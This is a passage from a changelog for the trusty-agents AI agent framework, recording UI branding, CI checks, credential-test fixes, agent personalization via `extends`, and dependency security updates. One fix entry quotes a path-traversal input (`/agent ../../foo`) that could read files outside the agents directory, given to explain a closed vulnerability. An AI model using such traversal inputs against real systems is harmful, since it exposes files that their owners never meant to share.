  `Mark.svelte` (standalone UNIT mark for constrained spots), used in
  `LogoMark.svelte`/`Sidebar.svelte`. Regenerates the Tauri app/launcher icon
  set from `trusty-agents-app-icon.png` and installs
  `trusty-agents-favicon.svg` as `public/favicon.svg`. `LogoMark.svelte`'s
  wordmark now reads "Trusty Agents" (was "Trusty Assistant"), matching the
  header lockup. The now-unused generic `RobotIcon.svelte` was removed (its
  two call sites were both replaced). This is an **intentional divergence**
  from the generic Foundry glyph set canonicalized in #3486/#3495 —
  trusty-agents carries its own product identity rather than vendoring the
  placeholder robot glyph verbatim; see
  `docs/design/UI/design-system/icons/README.md`'s "Canonical source,
  vendored copies" section for the documented exemption.

- **CI token drift-check (refs #3486):** a new `scripts/check_token_drift.mjs`
  pins this crate's `app.css` Foundry `--color-*` RGB-triple values to
  `docs/design/UI/design-system/tokens.css` (the canonical hex source),
  wired into CI as the `token-drift` workflow. Fails with a per-token diff if
  the two silently diverge; run locally via `pnpm run check:tokens`. No
  drift was found in this crate — every value already matched canonical.
  Guards against a zero-comparison false-green (an ENFORCED entry with an
  emptied `mappings`/`passthrough` previously reported "matches canonical"
  regardless of the file's real contents — caught by code-critic review) and
  ships `scripts/check_token_drift.test.mjs`, a `node:test` regression suite
  covering drift detection, missing-block/missing-token parse failures, and
  the zero-comparison guard, run in CI ahead of the real check.

### Fixed

- **Credential-test env isolation flake (#3464):** several `llm::credentials`,
  `llm::helpers`, `llm::adapter`, `llm::http`, `ctrl::ctrl_turn::dispatch`, and
  `runtime::cli_def` tests that assert "no credential resolves" or "the store
  wins when env is absent" intermittently failed under `cargo test --workspace`
  (and deterministically on any machine/CI runner with a real project or
  `$HOME` `.env.local`). Root cause: `trusty_common`'s `.env.local` loader is a
  process-global `OnceLock` that fires at most once per test binary; whichever
  test's credential-resolution call happened to be first could have it silently
  re-populate an env var a test had just cleared, mid-call. Fixed by forcing
  that loader to have already run (`test_env::force_env_local_loaded`) before
  any test clears credential env vars, and by clearing every registry-mapped
  provider's env var (not just the three `openrouter`/`anthropic`/`claude-code`
  names) in `other_configured_providers()`'s tests
  (`test_env::clear_all_credential_env_vars`). Also sandboxes `$HOME` in
  `ctrl_creds_errors_when_nothing_configured`, a pre-existing gap that made it
  fail deterministically on any machine with a real secure-store credential.
- **Favicon/RobotIcon drift (#3486):** `ui/public/favicon.svg` was a fourth,
  independently hand-drawn robot face (different rect/circle coordinates, a
  `<text>`-rendered `>_` mouth) that had drifted from `RobotIcon.svelte`'s
  actual markup. Regenerated the favicon's geometry from `RobotIcon.svelte`'s
  `full`-variant paths (same head rect, antenna, eye positions, and stroked
  chevron+underscore mouth) so there is a single robot design instead of two.

### Added

- **Shared-inference seam, Step 1+2 (#2410):** `llm::inference_bridge` is a
  pure, field-by-field conversion between `async-openai`'s wire types
  (`ChatCompletionRequestMessage`, `ChatCompletionTool`,
  `ChatCompletionMessageToolCall`) and `trusty_common::inference`'s shared
  request/response model, and `llm::inference_client::InferenceClient` is an
  OpenRouter transport built on it (mirrors `trusty-code`'s
  `OpenAiCompatClient`). Wired into `tool_loop::turn::dispatch_turn`'s plain
  OpenRouter branch behind `TAGENT_INFERENCE_SHARED=1` — **inert by default**:
  with the flag unset (or any value other than `"1"`), every existing call
  path is byte-for-byte unchanged, including the cache_control/tool_choice-
  forcing raw path, native-Anthropic-direct, ollama, and Bedrock, none of
  which this flag ever touches. Anthropic-direct migration and Fireworks
  routing are explicitly out of scope for this step (later epic steps).
- The API server now writes the standard `http_addr` discovery file on bind
  (and removes it on graceful shutdown), so the trusty-console reverse proxy can
  resolve the agents surface at `/api/agents/*` (#3331).

### Fixed

- Committed `ui/pnpm-lock.yaml` (architecture-review tranche 0): the file was gitignored with a comment claiming the repo-wide detect-secrets pre-commit hook flags npm integrity hashes, but the root `.pre-commit-config.yaml` already excludes `.*pnpm-lock\.yaml` (only the crate-scoped `crates/trusty-agents/.pre-commit-config.yaml`, which governs Python tooling and is unrelated to the JS UI, was missing that exclusion) and no CI workflow runs detect-secrets at all. Every other Tauri UI in the workspace (`trusty-mpm-gui`, `trusty-search`, `trusty-memory`, `trusty-analyze`, `trusty-code-gui`, `trusty-console`) already commits its own subdir-scoped `pnpm-lock.yaml`; `trusty-agents/ui` was the only outlier. Removed the stale `.gitignore` entry and regenerated the lockfile with `pnpm install --lockfile-only`.

### Added

- `PATCH /api/agents/:name` — persists a per-agent `model_id`/`provider_id` override to that agent's `.trusty-agents/agents/<name>.toml`, editing the `[agent]` table in place via `toml_edit` so every other key, comment, and prose block (e.g. a long system-prompt) survives untouched. `provider_id` is validated against the `trusty_common::inference::registry` catalog surfaced by `GET /api/models` (#3243); a `runner = "claude-code"` agent rejects any model/provider that doesn't resolve to Anthropic, since the local `claude` CLI only talks to Anthropic. Returns the updated agent in the same shape `GET /api/agents` uses, so a client can round-trip through either route. Pairs with the agent create/edit UI merged in #3279 (closes [#3246](https://github.com/bobmatnyc/trusty-tools/issues/3246), part of epic #3052)
- new bundled base `assistant` agent (`.trusty-agents/agents/assistant/`) — a reusable, **nameless** personal-productivity template derived from the "Izzie" prototype: functional `role = "assistant"`, the curated Google Workspace tool surface, `memory.read`/`memory.write`/`search.read` scopes plus **read-only** `google.read` (§5.5 — a generic template does not mutate a user's Google data by default), and generic helpful/productivity instructions, with NO persona name, user-identity binding, or user-specific skills. Persona identity is contributed by a user's `extends = "assistant"` personalization overlay (Eve §2.5.1). Izzie is now shipped as the reference overlay example (`.trusty-agents/agents/izzie/`): `extends = "assistant"` + personal deltas (display name, personal skills, Masa-bound persona) and an explicit opt-in to Google **write** (`google.*`). The `extends` inheritance resolver lands in [#3055](https://github.com/bobmatnyc/trusty-tools/issues/3055); until then the overlay carries the curated `[tools]` allowlist/scopes and the safety-critical persona guardrails (approval-framing, anti-hallucination) redundantly so it is safe standalone, and the working Izzie the REPL/Telegram persona paths load remains the standalone `izzie.toml` (closes [#3054](https://github.com/bobmatnyc/trusty-tools/issues/3054), refs #3052, #3055)

- `extends:`-based agent personalization (DOC-41 §2.5 / §2.5.1, epic #3052): a user can now personalize a stock/bundled base agent — name it, add tools, override tone — without forking it, by authoring a child agent (e.g. `~/.trusty-agents/agents/my-assistant.md`) that declares `extends: <base>` and layers personal deltas on top. The previously-inert `extends:` frontmatter key is now live. Resolution mirrors trusty-mpm's proven `compose_agent` exactly (same `MAX_DEPTH = 8`, case-insensitive base lookup, base-first prose concatenation) and runs once at load time — reachable from BOTH the informational `AgentRegistry::load` AND the real dispatch loaders `AgentConfig::by_name`/`by_name_async` (a flat `<name>.md` overlay tier was added to both so a personalization overlay actually dispatches, not just shows in the roster) — never per dispatch. Merge follows the §2.5 table: scalars (`model`, `display_name`, `role`, `description`, plus `runner` and opt-in `persistent_session`) child-overrides-parent; list fields (`tools.allowed`, `tools.scopes`, `system_prompt.skills`, `capabilities`) union (dedup, base-first); persona/instruction prose concatenates base-first; `llm`/`compress`/`session`/`plugins`/`rbac` inherit from the base wholesale. Cycles, missing parents, and over-deep chains fail with a clear `AgentExtendsError`; in the registry a failed resolution keeps the unresolved agent but surfaces the breakage in the roster / `tagent agents list` (new `AgentSummary::extends_error`). A directory package whose `extends` can't be resolved no longer silently shadows a complete flat `<name>.toml` — the loader falls back to the flat file with a warn. Case-only duplicate agent names are rejected at load (they broke case-insensitive resolution). `.md` agent frontmatter now also parses `tools:` and `display_name:` so a personalization overlay's declared tools actually union with the base's (closes [#3055](https://github.com/bobmatnyc/trusty-tools/issues/3055))

### Changed

- The REPL startup splash (`repl::tui::banner::banner_lines`, and its dormant widget-mode counterpart `draw_banner`) now renders the shared trusty splash art (`trusty_common::banner::TRUSTY_SPLASH_ART`, per-glyph shaded via `shade_bucket`) instead of a bespoke robot-glyph design, so `tagent`'s REPL presents the same trusty branding as `tm`'s launch banner (closes [#3326](https://github.com/bobmatnyc/trusty-tools/issues/3326)). The left column is now sized from the shared art's actual width instead of a fixed 18-col floor. tagent's own contextual text (identity line, recent activity, commands) is unchanged.
- `gworkspace` `[[tool_registry.endpoints]]` in the bundled default config now
  ships `enabled = true` (was `false`, "pending auth"). `rpc.discover` on the
  `trusty-gworkspace-mcp` server is a pure static function that never touches
  the token store, so eager discovery at harness startup always succeeds
  regardless of auth state; unauthenticated tool calls fail with a clear
  "run setup" operational error instead of a startup crash. Authenticate with
  `trusty-gworkspace-mcp setup` to actually light up Gmail/Calendar/Drive
  access for the Assistant (Phase 1 of the Assistant epic #3052, part of
  [#3056](https://github.com/bobmatnyc/trusty-tools/issues/3056))

### Fixed

- REPL `/agent <name>` (`handle_agent_command_into`, `crates/trusty-agents/src/repl/agent_commands.rs`) now resolves personas via the same directory-package + `extends`-aware loader the one-shot `--direct` path already used, instead of a hardcoded flat-file check (`agents_dir.join("{name}.toml")`) — so `/agent assistant` now activates the base Assistant persona, which ships only as a directory package (`assistant/agent.toml`, no flat `assistant.toml`). `/agent` with no argument (`list_assistant_agents_into`) now surfaces directory-package agents too, not just flat `*.toml` files, and `/switch assistant` is a recognized alias alongside ctrl/izzie/cto. Resolution is anchored to the REPL's own resolved `agents_dir` via a new `AgentConfig::by_name_in(dirs, name)` (the default-dirs `AgentConfig::by_name` is now a thin wrapper over it) rather than `by_name`'s process-global `TAGENT_CONFIG_DIR`/CWD dirs, so a standalone launch (CWD outside the project) still activates exactly what it just listed. `by_name`/`by_name_in` (and their async twin) also now reject an agent name containing `/`, `\`, or an exact `.`/`..` segment before any `dir.join(name)` join — closing a path-traversal gap where `/agent ../../foo` could read `agent.toml`/`persona.md` outside the intended agents directory (closes [#3303](https://github.com/bobmatnyc/trusty-tools/issues/3303), refs #3052)
- `run_pm_task_with_persona` (the dispatch path a selected named persona/Assistant chat turn takes) now reaches tool parity with the session path (`run_pm_task_with_history`) — delegation (`delegate_to_agent`), CTRL project-management (`add_project`, `list_projects`, `remove_project`, `stop_task`, `set_active_project`), filesystem (`move_file`, `create_dir`), search (`search_code`), shell (`run_bash`), and `tm` tools are now registered alongside the MCP/git/ticketing/live-MCP tools it already wired. Access is still gated per persona: a tool is only advertised to the LLM when its name matches the persona's `[tools].allow` glob list (extracted into the new pure `filter_persona_tool_names` helper, pinned by 4 unit tests) and passes the existing RBAC-tier filter — registering a tool is not the same as granting it, so no persona gains capability beyond what it already declares. Full `[tools].scopes` enforcement remains tracked separately by [#3208](https://github.com/bobmatnyc/trusty-tools/issues/3208) (closes [#3285](https://github.com/bobmatnyc/trusty-tools/issues/3285))
- `llm::credentials::pick_credentials()` now resolves `openrouter`/`anthropic`/`claude-code` via the shared `trusty_common::inference::credentials::resolve_key` 3-tier resolver (env > `.env.local` > secure keyring/file store) instead of a raw `std::env::var` read — a credential configured only via `tagent config keys set` was previously invisible at chat dispatch even though `trusty-channels` and this crate's own `GET /api/models` catalog already consulted the shared store (closes [#3248](https://github.com/bobmatnyc/trusty-tools/issues/3248))
- `tmux::orchestrator::TmuxOrchestrator::create_session` and `debugger::tmux::TmuxAdapter::create_session` now apply generous tmux scrollback (`history-limit=100000`) and mouse-wheel scrolling BEFORE `new-session`, via the new shared `trusty_common::tmux` layer — this crate previously ran its own independent tmux implementation with no scrollback handling at all, so every trusty-agents-hosted tmux session (including the debug REPL) was stuck at tmux's tiny 2000-line default even after trusty-mpm's #2398/#2399 fix landed (closes [#3004](https://github.com/bobmatnyc/trusty-tools/issues/3004), refs #2398, #2399)
- migrate off archived/unsound `serde_yml` (GHSA-hhw4-xg65-fp2x) and its transitive `libyml` (GHSA-gfxp-f68g-8x78) onto the workspace-blessed `serde_yaml` 0.9, closing Dependabot alerts #42/#43 (closes [#2991](https://github.com/bobmatnyc/trusty-tools/issues/2991))
- bump `lru` 0.12 → 0.16, fixing RUSTSEC-2026-0002 (`IterMut` violates Stacked Borrows, GHSA-rhfx-m35p-ff5j); no call-site changes needed ([#2782](https://github.com/bobmatnyc/trusty-tools/pull/2782)) ([`e62b454`](https://github.com/bobmatnyc/trusty-tools/commit/e62b4540d39c5a442d05e849197157932f37e664))
